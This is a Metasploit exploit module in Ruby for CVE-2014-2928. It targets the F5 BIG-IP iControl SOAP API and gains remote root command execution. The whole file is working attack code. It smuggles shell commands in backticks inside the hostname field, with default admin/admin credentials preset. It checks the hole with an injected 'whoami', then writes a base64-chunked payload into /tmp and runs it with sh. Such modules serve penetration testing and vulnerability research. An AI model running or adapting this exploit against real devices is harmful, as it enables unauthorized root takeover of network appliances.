# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "F5 iControl Remote Root Command Execution",
      &#039;Description&#039;    => %q{
        This module exploits an authenticated remote command execution
        vulnerability in the F5 BIGIP iControl API (and likely other
        F5 devices).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;bperry&#039; # Discovery, Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-2928&#039;],
          [&#039;URL&#039;, &#039;http://support.f5.com/kb/en-us/solutions/public/15000/200/sol15220.html&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;F5 iControl&#039;, {}]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Sep 17 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          Opt::RPORT(443),
          OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the iControl installation&#039;, &#039;/&#039;]),
          OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate with&#039;, &#039;admin&#039;]),
          OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with&#039;, &#039;admin&#039;])
        ], self.class)
  end

  def check
    get_hostname = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Body>
    <n1:get_hostname xmlns:n1="urn:iControl:System/Inet" />
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    }

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;iControl&#039;, &#039;iControlPortal.cgi&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => get_hostname,
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
    })

    res.body =~ /y:string">(.*)<\/return/
    hostname = $1
    send_cmd("whoami")

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;iControl&#039;, &#039;iControlPortal.cgi&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => get_hostname,
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
    })

    res.body =~ /y:string">(.*)<\/return/
    new_hostname = $1

    if new_hostname == "root.a.b"
      pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
        <SOAP-ENV:Body>
        <n1:set_hostname xmlns:n1="urn:iControl:System/Inet">
        <hostname>#{hostname}</hostname>
        </n1:set_hostname>
        </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
      }

      send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;iControl&#039;, &#039;iControlPortal.cgi&#039;),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;data&#039; => pay,
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      })

      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def send_cmd(cmd)
    pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
      <SOAP-ENV:Body>
      <n1:set_hostname xmlns:n1="urn:iControl:System/Inet">
        <hostname>`#{cmd}`.a.b</hostname>
        </n1:set_hostname>
        </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
    }

    send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;iControl&#039;, &#039;iControlPortal.cgi&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => pay,
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
    })
  end

  def exploit
    filename = Rex::Text.rand_text_alpha_lower(5)

    print_status(&#039;Sending payload in chunks, might take a small bit...&#039;)
    i = 0
    while i < payload.encoded.length
      cmd = "echo #{Rex::Text.encode_base64(payload.encoded[i..i+4])}|base64 --decode|tee -a /tmp/#{filename}"
      send_cmd(cmd)
      i = i + 5
    end

    print_status(&#039;Triggering payload...&#039;)

    send_cmd("sh /tmp/#{filename}")
  end
end

